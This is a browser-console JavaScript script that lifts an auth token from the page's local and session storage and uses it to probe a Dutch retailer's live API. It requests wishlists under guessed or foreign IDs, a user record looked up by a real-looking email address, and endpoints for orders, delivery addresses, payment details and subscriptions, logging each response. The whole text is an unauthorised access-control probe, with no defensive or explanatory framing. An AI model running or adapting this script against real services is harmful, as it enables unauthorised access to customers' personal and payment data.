const B='https://api.kruidvat.nl';
let tok=null;
for(const s of [localStorage,sessionStorage])for(let i=0;i<s.length;i++){const k=s.key(i);const v=s.getItem(k);if(k.includes('auth')||/token/i.test(k)){const m=v.match(/[A-Za-z0-9_-]{20,}/);if(m)tok=m[0];}}
const H={'Authorization':'bearer '+tok,'Accept':'application/json'};
const own='9b3b1ab2-0a8b-4c46-bfa9-164bb9b4b3fb';
const rnd='00000000-0000-0000-0000-000000000000';
const uid='f6f417f3-ab85-4319-bf3d-f472bac6b5f0';
const paths=[
 '/api/v2/kvn-spa/wishlists/'+own,
 '/api/v2/kvn-spa/wishlists/'+rnd,
 '/api/v2/kvn-spa/wishlist/'+own,
 '/api/v2/kvn-spa/wishlists/'+own+'/entries',
 '/api/v2/kvn-spa/users/'+uid,
 '/api/v2/kvn-spa/users/neil.hkrmzn@gmail.com',
 '/api/v2/kvn-spa/orders',
 '/api/v2/kvn-spa/order-history',
 '/api/v2/kvn-spa/consignments',
 '/api/v2/kvn-spa/delivery-addresses',
 '/api/v2/kvn-spa/payment-details',
 '/api/v2/kvn-spa/subscriptions'
];
(async()=>{for(const p of paths){try{const r=await fetch(B+p,{headers:H,credentials:'include'});const t=await r.text();console.log(r.status,p,'|',t.slice(0,180).replace(/\n/g,' '));}catch(e){console.log('ERR',p,e.message)}await new Promise(s=>setTimeout(s,300));}})();
console.log('DONE');
